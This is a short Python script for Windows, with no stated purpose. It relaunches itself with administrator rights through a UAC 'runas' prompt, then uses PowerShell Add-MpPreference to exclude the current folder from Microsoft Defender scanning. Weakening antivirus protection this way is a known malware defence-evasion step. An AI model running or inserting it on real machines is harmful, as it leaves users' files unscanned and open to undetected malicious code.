import subprocess
import os
import sys
import win32com.shell.shell as shell


if sys.argv[-1] != 'asadmin':
    script = os.path.abspath(sys.argv[0])
    params = ' '.join([script]+sys.argv[1:]+['asadmin'])
    shell.ShellExecuteEx(lpVerb='runas',lpFile=sys.executable,lpParameters=params)
    sys.exit(0)

script = "powershell -Command Add-MpPreference -ExclusionPath "+os.getcwd()
subprocess.call(script,shell=True)
os.system("pause")